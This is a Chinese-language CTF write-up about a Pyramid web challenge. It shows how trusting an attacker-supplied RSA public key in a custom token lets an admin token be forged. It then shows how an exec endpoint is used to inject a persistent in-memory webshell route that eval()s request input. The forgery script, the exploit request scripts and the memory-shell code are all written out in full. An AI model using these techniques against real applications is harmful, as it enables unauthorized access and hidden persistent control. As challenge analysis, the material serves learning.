Pyramid框架下内存马的分析构造及RS加密签名伪造
---------------------------

题目源代码如下  
app.py

```python
from wsgiref.simple_server import make_server
from pyramid.config import Configurator
from pyramid.events import NewResponse
from pyramid.response import Response
import util

users = []
super_user = ["admin"]
default_alg = "RS"

def register_api(request):
    try:
        username = request.params['username']
        if username in super_user:
            return Response("Not Allowed!")
        password = request.params['password']
    except:
        return Response('Please Input username & password', status="500 Internal Server")
    data = {"username": username, "password": password}
    users.append(data)
    token = util.data_encode(data, default_alg)
    return Response("Here is your token: "+ token)

def register_front(request):
    return Response(util.read_html('register.html'))

def front_test(request):
    eval()
    return Response(util.read_html('test.html'))

def system_test(request):
    try:
        code = request.params['code']
        token = request.params['token']
        data = util.data_decode(token)
        if data:
            username = data['username']
            print(username)
            if username in super_user:
                print("Welcome super_user!")
            else:
                return Response('Unauthorized', status="401 Unauthorized")
        else:
            return Response('Unauthorized', status="401 Unauthorized")

    except:
        return Response('Please Input code & token')
    print(exec(code))
    return Response("Success!")

if __name__ == '__main__':
    with Configurator() as config:
        config.add_route('register_front', '/')
        config.add_route('register_api', '/api/register')
        config.add_route('system_test', '/api/test')
        config.add_route('front_test', '/test')
        config.add_view(system_test, route_name='system_test')
        config.add_view(front_test, route_name='front_test')
        config.add_view(register_api, route_name='register_api')
        config.add_view(register_front, route_name='register_front')
        app = config.make_wsgi_app()

    server = make_server('0.0.0.0', 6543, app)
    server.serve_forever()

```

还有一个工具util.py

```python
import base64
import json
import uuid
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import hashlib

secret = str(uuid.uuid4())

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

def sign_data(private_key, data):
    rsakey = RSA.import_key(private_key)
    # 将JSON数据转换为字符串
    data_str = json.dumps(data)
    hash_obj = SHA256.new(data_str.encode('utf-8'))
    signature = pkcs1_15.new(rsakey).sign(hash_obj)
    return signature

def verify_signature(secret, data, signature, alg):
    if alg == 'RS':
        rsakey = RSA.import_key(secret)
        # 将JSON数据转换为字符串
        data_str = json.dumps(data)
        hash_obj = SHA256.new(data_str.encode('utf-8'))
        try:
            pkcs1_15.new(rsakey).verify(hash_obj, signature)
            print("Signature is valid. Transmitted data:", data)
            return True
        except (ValueError, TypeError):
            print("Signature is invalid.")
            return False
    elif alg == 'HS':
        hash_object = hashlib.sha256()
        data_bytes = (json.dumps(data) + secret.decode()).encode('utf-8')
        print(data_bytes)
        hash_object.update(data_bytes)
        hex_dig = hash_object.hexdigest()
        if hex_dig == signature.decode():
            return True
    else:
        return False

def data_encode(data, alg):
    if alg not in ['HS', 'RS']:
        raise "Algorithm must be HS or RS!"
    else:
        private_key, public_key = generate_keys()
        if alg == 'RS':
            signature = sign_data(private_key, data)
            data_bytes = json.dumps(data).encode('utf-8')
            encoded_data1 = base64.b64encode(data_bytes)  # data
            encoded_data2 = base64.b64encode(signature)  # signature
            print(encoded_data2)
            encoded_data3 = base64.b64encode(alg.encode('utf-8'))  # alg
            encoded_data4 = base64.b64encode(public_key)  # public_key
            encoded_data = encoded_data1.decode() + '.' + encoded_data2.decode() + '.' + encoded_data3.decode() + '.' + encoded_data4.decode()
            print("The encoded data is: ", encoded_data)
            return encoded_data
        else:
            hash_object = hashlib.sha256()
            data_bytes = (json.dumps(data) + secret).encode('utf-8')
            inputdata = json.dumps(data).encode('utf-8')
            hash_object.update(data_bytes)
            hex_dig = hash_object.hexdigest()
            signature = base64.b64encode(hex_dig.encode('utf-8'))
            encoded_data1 = base64.b64encode(inputdata)  # data
            encoded_data3 = base64.b64encode(alg.encode('utf-8'))  # alg
            encoded_data = encoded_data1.decode() + '.' + signature.decode() + '.' + encoded_data3.decode()
            print("The encoded data is: ", encoded_data)
            return encoded_data

def data_decode(encode_data):
    try:
        all_data = encode_data.split('.')
        sig_bytes = all_data[1].replace(' ', '+').encode('utf-8')
        print(sig_bytes)
        data = base64.b64decode(all_data[0].replace(' ', '+')).decode('utf-8')
        json_data = json.loads(data)
        signature = base64.b64decode(sig_bytes)
        alg = base64.b64decode(all_data[2]).decode('utf-8')
        key = secret
        if len(all_data) == 4:
            key_bytes = all_data[3].replace(' ', '+').encode('utf-8')
            key = base64.b64decode(key_bytes)  # bytes
        # 验证签名
        is_valid = verify_signature(key, json_data, signature, alg)
        if is_valid:
            return json_data
        else:
            return False
    except:
        raise "something error"

def read_html(filname):
    with open('C:\\Users\\86150\\Desktop\\attachment\\src\\static\\' + filname, 'r', encoding='utf-8') as file:
        # 读取文件内容
        html_content = file.read()
    return html_content

```

### RS加密伪造

由以上源码发现首先需要伪造admin用户token才能进入test路由进行命令执行，但是由于RS算法的密钥是随机的我们不能够伪造admin

```python
def generate_keys():  
    key = RSA.generate(2048)  
    private_key = key.export_key()  
    public_key = key.publickey().export_key()  
    return private_key, public_key
```

![82dd4579fddf444658e30f5738fc0e07.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-6f25f9b1296894479fac96cea25f164e16a3df7f.png)

成功注册会返回token

![087953315a7380c82001c0a87dbfb32e.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-89aaca9d5146879779e1396eea7f5d0a9ca981a2.png)

我们本地调试解密函数

```python
def data_decode(encode_data):
    try:
        all_data = encode_data.split('.')
        sig_bytes = all_data[1].replace(' ', '+').encode('utf-8')
        print(sig_bytes)
        data = base64.b64decode(all_data[0].replace(' ', '+')).decode('utf-8')
        json_data = json.loads(data)
        signature = base64.b64decode(sig_bytes)
        alg = base64.b64decode(all_data[2]).decode('utf-8')
        key = secret
        if len(all_data) == 4:
            key_bytes = all_data[3].replace(' ', '+').encode('utf-8')
            key = base64.b64decode(key_bytes)  # bytes
        # 验证签名
        is_valid = verify_signature(key, json_data, signature, alg)
        if is_valid:
            return json_data
        else:
            return False
    except:
        raise "something error"
```

调试发现加密token的第四个字段如果存在就是自定义的key

![c7edd4514741e51df28deb8484e2f847.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-08f6694936df58925529610962b523aba9f04b77.png)

之后验证签名的正确性，这个key就是RSA的公钥

![fa805ce2455a500162a535994e5224b5.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-af50183c95b76d43199b56a171c45ad5410d6da2.png)

既然第四个字段是我们自己可控，我们就可以本地生成RSA的私钥和公钥来伪造admin  
编写脚本

```python
import util
import base64
import json
import uuid
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import hashlib

secret = str(uuid.uuid4())

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

def sign_data(private_key, data):
    rsakey = RSA.import_key(private_key)
    # 将JSON数据转换为字符串
    data_str = json.dumps(data)
    hash_obj = SHA256.new(data_str.encode('utf-8'))
    signature = pkcs1_15.new(rsakey).sign(hash_obj)
    return signature

def data_encode(data, alg):
    if alg not in ['HS', 'RS']:
        raise "Algorithm must be HS or RS!"
    else:
        private_key, public_key = generate_keys()
        if alg == 'RS':
            signature = sign_data(private_key, data)
            data_bytes = json.dumps(data).encode('utf-8')
            encoded_data1 = base64.b64encode(data_bytes)  # data
            encoded_data2 = base64.b64encode(signature)  # signature
            encoded_data3 = base64.b64encode(alg.encode('utf-8'))  # alg
            encoded_data4 = base64.b64encode(public_key)  # public_key
            encoded_data = encoded_data1.decode() + '.' + encoded_data2.decode() + '.' + encoded_data3.decode() + '.' + encoded_data4.decode()
            return encoded_data
        else:
            hash_object = hashlib.sha256()
            data_bytes = (json.dumps(data) + secret).encode('utf-8')
            inputdata = json.dumps(data).encode('utf-8')
            hash_object.update(data_bytes)
            hex_dig = hash_object.hexdigest()
            signature = base64.b64encode(hex_dig.encode('utf-8'))
            encoded_data1 = base64.b64encode(inputdata)  # data
            encoded_data3 = base64.b64encode(alg.encode('utf-8'))  # alg
            encoded_data = encoded_data1.decode() + '.' + signature.decode() + '.' + encoded_data3.decode()
            print("The encoded data is: ", encoded_data)
            return encoded_data

pri,pub = generate_keys()

data = {"username": "admin", "password": "password"}

token =data_encode(data, 'RS')
print(token)
```

生成签名如下

```php
eyJ1c2VybmFtZSI6ICJhc2QiLCAicGFzc3dvcmQiOiAiYXNkIn0=.eEcoFIFpoy5KcN7xwor+UGsbhTuNYc7C2cEllC2g3xj0h+35bcKvuEJQCfTsq+K3Ax1WxBoqtFY8WByr+ajRwAJdbZRXlm6iEw6f9wd6CwIyUekTbxBy5qnI/zxkgF/84QkIk4N1p/sBAxgJkww5X9hlhAI4GANFSAFsSG3gX2Ij22ZrCgQgQK/oU8oCIaKY9psHbdFEOvgcTIvJ3oT04gmJlPjC80akNC/TG9CmrrT0DI6hPFkIHQejZxW2T5/0AHMJuN/DvsjAdTRH8If0/aK9XjX6m285q8Buj07PZRFNZB5A2Kr50yIuyeeVdhH4OXpAp+4BCbFVwT1WSbCf8A==.UlM=.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF1Rzhld0ovMGJHK29sV3d0K2s4MAorNC9ram01aXFFbzk5ZHNnK0xJOGthWUVIdzVtRU81bDBXZnB3V3VCN3l0UE9oajFzbXQ2NlY1R3lld3oxVFdLCkNrSVdHeG90TVlFelpWeGtHdHFlNUdONkdVY1I2MTcySnNwWVNNeEdaZlI3enpPbXlxdTZsMHlid3BYemUrT2YKaTV6dVhmSnZuMlgwaFdXMDVtbzNUU05hU1BxTnJQTllKb3l5RzBxLy9qbkhjM3BobzRiVU1nN2N0N3ZkekVyeAo1MWtLTmcrOTZLQjU5TUZvck1hZjNhODNsdisrVzk3aFFKbjkyU0RMYkNjY1psS3A5QVk0Nzl1WS90UUt0ZHRMCmJEWkVBQU8wVG5nS3k4cGIvQU5EL28wemRHTnpxYUVpTzZ2YW1FOGNScDZPS241aEkvRFY1aFJiSG81dUJ3WHMKaHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
```

### Pyramid WEB新框架下的内存马

经过测试发现题目不出网无回显，只能够探索Pyramid WEB新框架下的内存马

我们审计代码发现其App是通过pyramid.config来生成的

![835f5bfaf9d5d7727059333128192874.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-995c9d0dda11c54a07de04d57de57b633457286e.png)  
先寻找一些Pyramid框架下的添加路由

```python
>>> from pyramid.config import Configurator
>>> dir(Configurator())
```

我们发现里面关键函数有

```r
add_view   add_route

['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_add_predicate', '_add_tween', '_ainfo', '_apply_view_derivers', '_check_view_options', '_ctx', '_del_introspector', '_derive_predicate', '_derive_subscriber', '_derive_view', '_fix_registry', '_get_action_state', '_get_introspector', '_get_static_info', '_make_spec', '_override', '_set_action_state', '_set_introspector', '_set_locale_negotiator', '_set_root_factory', '_set_settings', 'absolute_asset_spec', 'absolute_resource_spec', 'action', 'action_info', 'action_state', 'add_accept_view_order', 'add_cache_buster', 'add_default_accept_view_order', 'add_default_renderers', 'add_default_response_adapters', 'add_default_route_predicates', 'add_default_security', 'add_default_tweens', 'add_default_view_derivers', 'add_default_view_predicates', 'add_directive', 'add_exception_view', 'add_forbidden_view', 'add_notfound_view', 'add_permission', 'add_renderer', 'add_request_method', 'add_resource_url_adapter', 'add_response_adapter', 'add_route', 'add_route_predicate', 'add_settings', 'add_static_view', 'add_subscriber', 'add_subscriber_predicate', 'add_translation_dirs', 'add_traverser', 'add_tween', 'add_view', 'add_view_deriver', 'add_view_predicate', 'autocommit', 'basepath', 'begin', 'commit', 'derive_view', 'end', 'get_predlist', 'get_routes_mapper', 'get_settings', 'hook_zca', 'include', 'includepath', 'info', 'inspect', 'introspectable', 'introspection', 'introspector', 'make_wsgi_app', 'manager', 'maybe_dotted', 'name_resolver', 'object_description', 'override_asset', 'override_resource', 'package', 'package_name', 'registry', 'root_package', 'route_prefix', 'route_prefix_context', 'scan', 'set_authentication_policy', 'set_authorization_policy', 'set_csrf_storage_policy', 'set_default_csrf_options', 'set_default_permission', 'set_execution_policy', 'set_forbidden_view', 'set_locale_negotiator', 'set_notfound_view', 'set_request_factory', 'set_response_factory', 'set_root_factory', 'set_security_policy', 'set_session_factory', 'set_view_mapper', 'setup_registry', 'testing_add_renderer', 'testing_add_subscriber', 'testing_add_template', 'testing_models', 'testing_resources', 'testing_securitypolicy', 'unhook_zca', 'venusian', 'with_package']
```

![2ecbe234d9b7c7c21eb5f7dbf7d0b006.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-dae7eec2a13ef4bef0c433e914b0a9298eb0dbe2.png)  
结合题目中的注册路由用法如下

```python
def register_front(request):  
    return Response(util.read_html('register.html'))

with Configurator() as config:  
    config.add_route('register_front', '/')  
    config.add_route('register_api', '/api/register')  
    config.add_route('system_test', '/api/test')  
    config.add_route('front_test', '/test')  
    config.add_view(system_test, route_name='system_test')  
    config.add_view(front_test, route_name='front_test')  
    config.add_view(register_api, route_name='register_api')  
    config.add_view(register_front, route_name='register_front')  
    app = config.make_wsgi_app()
```

我们构造自己的内存马首先要获取到**栈帧的globals全局**才能拿到当前的**app config**

编写脚本如下

```python
import requests
from urllib.parse import quote
code='''def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()             
    frame = next(g)     
    b = frame.f_back.f_back.f_globals
    print(b)

waff()
'''

code1="print(1)"
burp0_url = "http://127.0.0.1:6543/api/test?code="+code+"&token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i"}
res=requests.get(burp0_url, headers=burp0_headers)
print(res.text)
```

成功拿到栈帧中的全局变量

![41635c504773f34ea4a3868d46ee70fc.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-e9e96b253d629c1df6be47a813b4afe8ba3b2652.png)  
接下来就是注册路由添加内存马，我们通过定义路由函数仿照源代码中写内存马

```python
def hello(request):
        code = request.params['code']
        res=eval(code)
        return Response(res)

config.add_route('shellb', '/shellb')
config.add_view(hello, route_name='shellb')
config.commit()
```

编写脚本如下

```python
import requests
from urllib.parse import quote
code='''def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()             
    frame = next(g)     
    b = frame.f_back.f_back.f_globals
    def hello(request):
        code = request.params['code']
        res=eval(code)
        return Response(res)

    config.add_route('shellb', '/shellb')
    config.add_view(hello, route_name='shellb')

waff()
'''

code1="print(1)"
burp0_url = "http://127.0.0.1:6543/api/test?code="+code+"&token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i"}
res=requests.get(burp0_url, headers=burp0_headers)
print(res.text)
```

但是发现并没有注册上路由，访问还是404，难点就在这里折磨了好久，猜测原因是，配置好路由之后才注册的app，注册好之后就不能添加路由了

```python
        config.add_view(register_api, route_name='register_api')
        config.add_view(register_front, route_name='register_front')
        app = config.make_wsgi_app()
```

经过不断调试，并且一个一个查看 [`pyramid.config`](https://docs.pylonsproject.org/projects/pyramid/en/latest/api/config.html#module-pyramid.config "pyramid.config")官方手册找函数发现一个commit函数

![6a52ba93cf6163b2b1d59106330e78a5.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-d888056f00f29aef6ad1e3a2028b9b54bbd4d1e8.png)

翻译一下即：

```r
提交任何待处理的配置操作。如果配置 在 pending 配置操作中检测到冲突，此方法 将引发 ;在 traceback 中 的 this 错误将是有关冲突来源的信息
```

发现config的**commit**函数可以提交经过配置的后的行为，那么我们便可以在添加路由后进行commit就可以成功添加

```python
import requests
from urllib.parse import quote
code='''def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()             
    frame = next(g)     
    b = frame.f_back.f_back.f_globals
    def hello(request):
        code = request.params['code']
        res=eval(code)
        return Response(res)

    config.add_route('shellb', '/shellb')
    config.add_view(hello, route_name='shellb')
    config.commit()

waff()
'''

code1="print(1)"
burp0_url = "http://127.0.0.1:6543/api/test?code="+code+"&token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i"}
res=requests.get(burp0_url, headers=burp0_headers)
print(res.text)
```

访问内存马路由成功执行命令

![c42661f525a47da80868200a455bd438.png](https://shs3.b.qianxin.com/attack_forum/2024/12/attach-c21e3dbc8b629baaf1ab5edaa2d16b9750576003.png)